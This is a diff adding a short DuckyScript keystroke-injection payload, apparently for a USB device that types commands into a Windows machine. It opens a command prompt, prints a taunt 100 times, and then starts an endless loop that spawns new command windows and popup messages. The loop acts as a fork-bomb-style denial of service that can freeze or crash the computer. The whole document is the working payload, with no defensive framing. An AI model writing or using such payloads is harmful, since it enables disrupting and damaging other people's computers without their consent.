@@ -1,0 +1,9 @@
+REM Made by LuC8fN
+GUI r
+STRING cmd
+ENTER
+STRING for /l %i in (1,1,100) do echo Bro is Cooooked
+ENTER
+DELAY 10000
+STRING for /L %i in () do start cmd & msg * "TOLD YOU"
+ENTER
